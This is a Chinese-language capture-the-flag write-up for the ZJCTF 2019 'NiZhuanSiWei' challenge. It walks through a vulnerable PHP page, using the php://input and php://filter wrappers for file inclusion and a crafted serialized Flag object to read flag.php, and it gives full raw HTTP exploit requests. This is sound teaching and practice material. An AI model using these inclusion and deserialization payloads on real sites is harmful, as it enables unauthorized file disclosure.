# ZJCTF 2019

## NiZhuanSiWei

> *2021/07/06*

### 题目

进去发现源码

```php
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

这里需要上传三个参数`text`，`file`，`password`，`text`需要引入一个包含`welcome to the zjctf`的文件，这里可以采用`php://input`伪协议的方法，或者采用远程引入的方法；`file`参数则是不能包含`flag`，我们看到注释中包含`useless.php`，我们先用`php://filter`伪协议读取`useless.php`的源代码，base64解码；password暂时还没什么利用方向

```php
<?php  
class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
```

我们读取到了`useless.php`的源代码，现在要利用他来进行我们的反序列化，这时候前面的`password`就派上了用场，因为`Flag`类中，包括我们的`__toString`魔术方法，会在我们把**对象当做字符串使用时调用**，利用我们的`Flag`类进行反序列化拿到`flag`

### payload

```http
POST /?text=php://input&file=php://filter/read=convert.base64-encode/resource=useless.php&password=1 HTTP/1.1
Host: 2f0f5908-ccea-41ad-9d55-cd848ecede29.node4.buuoj.cn
Content-Length: 0
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://2f0f5908-ccea-41ad-9d55-cd848ecede29.node4.buuoj.cn
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://2f0f5908-ccea-41ad-9d55-cd848ecede29.node4.buuoj.cn/?text=php://input&file=php://filter/read=conver.base64-encode/resource=useless.php&password=1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: UM_distinctid=17a7701d69cded-0a36b994c25fd8-6373264-384000-17a7701d69d9e0
Connection: close

welcome to the zjctf
```

```php
<?php
include useless.php
    
$res = new Flag();
$res->file = 'flag.php';
echo serialize($res);

// O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

```http
POST /?text=php://input&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";} HTTP/1.1
Host: 2f0f5908-ccea-41ad-9d55-cd848ecede29.node4.buuoj.cn
Content-Length: 20
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://2f0f5908-ccea-41ad-9d55-cd848ecede29.node4.buuoj.cn
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://2f0f5908-ccea-41ad-9d55-cd848ecede29.node4.buuoj.cn/?text=php://input&file=php://filter/read=conver.base64-encode/resource=useless.php&password=1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: UM_distinctid=17a7701d69cded-0a36b994c25fd8-6373264-384000-17a7701d69d9e0
Connection: close

welcome to the zjctf
```